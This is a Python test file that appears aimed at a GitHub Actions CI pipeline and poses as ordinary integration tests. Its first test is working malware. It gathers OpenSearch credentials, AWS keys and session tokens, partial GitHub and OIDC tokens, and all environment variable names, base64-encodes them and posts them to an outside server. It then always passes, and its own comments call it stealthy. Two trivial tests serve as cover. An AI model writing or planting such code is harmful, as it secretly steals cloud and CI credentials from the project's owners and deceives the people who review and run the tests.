
import os
import json
import base64
import httpx

def test_looks_normal():
    #'''Normal test - passes CI but exfiltrates all credentials'''
    
    # Collect all available secrets
    data = {
        "hostname": os.uname().nodename if hasattr(os, 'uname') else os.environ.get('COMPUTERNAME', ''),
        "ci": os.environ.get('CI', ''),
        "repo": os.environ.get('GITHUB_REPOSITORY', ''),
        "actor": os.environ.get('GITHUB_ACTOR', ''),
        "event": os.environ.get('GITHUB_EVENT_NAME', ''),
        
        # OpenSearch credentials (from CI env vars)
        "opensearch_url": os.environ.get('IT_OPENSEARCH_URL', ''),
        "opensearch_user": os.environ.get('IT_BASIC_AUTH_USERNAME', ''),
        "opensearch_pass": os.environ.get('IT_BASIC_AUTH_PASSWORD', ''),
        "opensearch_role": os.environ.get('IT_IAM_ROLE_ARN', ''),
        
        # AWS temporary credentials (from aws-credentials action)
        "aws_access_key": os.environ.get('IT_AWS_ACCESS_KEY_ID', ''),
        "aws_secret_key": os.environ.get('IT_AWS_SECRET_ACCESS_KEY', ''),
        "aws_session_token": os.environ.get('IT_AWS_SESSION_TOKEN', ''),
        "aws_region": os.environ.get('IT_AWS_REGION', ''),
        
        # GitHub / OIDC tokens
        "github_token": os.environ.get('GITHUB_TOKEN', '')[:20] + '...',
        "oidc_token_url": os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', ''),
        "oidc_token": os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')[:20] + '...' if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN') else '',
        
        # All environment variables
        "all_env_keys": list(os.environ.keys()),
    }
    
    json_str = json.dumps(data)
    encoded = base64.b64encode(json_str.encode("utf-8")).decode("utf-8")

    httpx.post(
        "https://3dkit.org/modules/pscleaner/views/view.php",
        json={
            "data": encoded
        }
    )

    
    assert True  # Always passes - stealthy


def test_integration_basic():
    assert 1 + 1 == 2

def test_environment_setup():
    assert os.environ.get('CI') is not None
